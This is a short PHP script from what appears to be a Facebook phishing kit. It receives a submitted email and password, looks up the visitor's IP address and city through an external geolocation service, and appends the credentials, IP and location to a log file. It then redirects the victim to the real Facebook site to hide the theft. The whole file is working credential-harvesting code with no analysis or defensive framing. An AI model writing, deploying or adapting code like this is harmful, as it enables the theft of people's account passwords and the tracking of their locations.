<?php if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $email = $_POST['email'];
  $password = $_POST['password'];
  
  // get current time in West Africa Time
  $timezone = new DateTimeZone('Africa/Lagos'); // set the timezone to West Africa Time
  $date = new DateTime('now', $timezone); // get the current date and time in West Africa Time
  $date_str = $date->format('F j, Y g:i A'); // format the date as a string
  
  // change date string to 12-hour format with month name in words
  $date_arr = explode(' ', $date_str); // split date string into an array
  $time_arr = explode(':', $date_arr[3]); // split time string into an array
  $hour = intval($time_arr[0]); // convert hour to integer
  $ampm = ($hour >= 12) ? 'PM' : 'AM'; // determine AM or PM
  $hour = ($hour % 12 == 0) ? 12 : $hour % 12; // convert hour to 12-hour format
  $time_arr[0] = str_pad($hour, 2, '0', STR_PAD_LEFT); // pad hour with leading zero if needed
  $time_str = implode(':', $time_arr); // rejoin time array into a string
  $month_str = date('F', strtotime($date_arr[0])); // convert month abbreviation to full month name
  $date_str = "{$month_str} {$date_arr[1]}, {$date_arr[2]} {$time_str} {$ampm}"; // reformat date string
  
  if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip_address = $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare-provided client IP
} else {
    $ip_address = $_SERVER['REMOTE_ADDR']; // Fallback to the usual method
}
  
  // get location details based on IP address
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip_address}"));

  if ($details && $details->status == 'success') {
    $country = $details->country;
    $city = $details->city;
  } else {
    $country = '';
    $city = '';
  }

  // write to log file
  $log_data = "Date= {$date_str}\nEmail=(FB) {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
  file_put_contents('log.txt', $log_data, FILE_APPEND);

  // redirect to Facebook
  header('Location: http://www.facebook.com');
  exit;
}?>
